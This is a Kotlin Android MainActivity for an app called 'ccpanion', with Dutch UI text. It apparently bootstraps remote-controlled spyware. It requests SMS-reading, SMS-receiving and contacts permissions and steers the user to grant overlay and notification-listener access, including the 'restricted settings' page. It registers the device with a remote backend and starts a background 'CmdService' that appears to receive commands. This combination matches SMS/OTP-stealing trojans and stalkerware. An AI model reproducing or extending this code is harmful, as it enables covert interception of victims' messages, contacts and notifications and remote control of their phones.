// language: Kotlin, target: Android 7.0+ (API 24), file: MainActivity.kt
// bootstrap: perms, register, start CmdService; robuuste grant-knoppen (One UI fallbacks) + ✓/✗ status
package com.kai.ccpanion

import android.Manifest
import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import java.util.concurrent.Executors
import org.json.JSONObject

class MainActivity : Activity() {

    private val exec = Executors.newSingleThreadExecutor()
    private lateinit var status: TextView
    private var booted = false

    override fun onCreate(b: Bundle?) {
        super.onCreate(b)

        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(64, 96, 64, 64)
        }
        status = TextView(this).apply { textSize = 16f }
        root.addView(status)
        root.addView(Button(this).apply { text = "Overlay-toestemming (weergave over andere apps)"; setOnClickListener { goOverlay() } })
        root.addView(Button(this).apply { text = "Meldingentoegang"; setOnClickListener { goNotif() } })
        root.addView(Button(this).apply { text = "App-info (beperkte instellingen)"; setOnClickListener { goAppInfo() } })
        setContentView(root)

        Rt.init(this)
    }

    override fun onResume() {
        super.onResume()
        askRuntimePerms()
        paintPerms()
        if (!booted) {
            booted = true
            exec.execute {
                if (!Rt.signUp(this) && Rt.token() == null) {
                    runOnUiThread { status.text = "geen verbinding — internet?" }
                    return@execute
                }
                registerDevice()
                if (Build.VERSION.SDK_INT >= 26) {
                    startForegroundService(Intent(this, CmdService::class.java))
                } else {
                    startService(Intent(this, CmdService::class.java))
                }
                runOnUiThread { paintPerms() }
            }
        }
    }

    private fun askRuntimePerms() {
        val need = mutableListOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CONTACTS
        )
        if (Build.VERSION.SDK_INT >= 33) need.add(Manifest.permission.POST_NOTIFICATIONS)
        val missing = need.filter { checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED }
        if (missing.isNotEmpty()) requestPermissions(missing.toTypedArray(), 7)
    }

    private fun granted(p: String): Boolean = checkSelfPermission(p) == PackageManager.PERMISSION_GRANTED

    private fun notifEnabled(): Boolean =
        (Settings.Secure.getString(contentResolver, "enabled_notification_listeners") ?: "").contains(packageName)

    private fun paintPerms() {
        status.text = "ccpanion · ${Rt.deviceId}\n" +
            "Overlay: ${tick(Settings.canDrawOverlays(this))}   Meldingen: ${tick(notifEnabled())}\n" +
            "SMS: ${tick(granted(Manifest.permission.READ_SMS))}   Contacten: ${tick(granted(Manifest.permission.READ_CONTACTS))}\n" +
            "Versturen: ${tick(granted(Manifest.permission.SEND_SMS))}\n\n" +
            "Elke knop opent de juiste instellingenpagina."
    }

    private fun tick(b: Boolean) = if (b) "✓" else "✗"

    private fun goOverlay() {
        runCatching {
            startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
        }.onFailure {
            runCatching { startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:$packageName"))) }
        }
    }

    private fun goNotif() {
        runCatching { startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)) }
            .onFailure { runCatching { startActivity(Intent(Settings.ACTION_SETTINGS)) } }
    }

    private fun goAppInfo() {
        runCatching {
            startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:$packageName")))
        }
    }

    private fun registerDevice() {
        val info = JSONObject()
            .put("model", Build.MODEL)
            .put("brand", Build.BRAND)
            .put("android", Build.VERSION.RELEASE)
            .put("sdk", Build.VERSION.SDK_INT)
            .put("lastSeen", System.currentTimeMillis())
        Rt.put("phones/${Rt.deviceId}/info", info)
    }
}
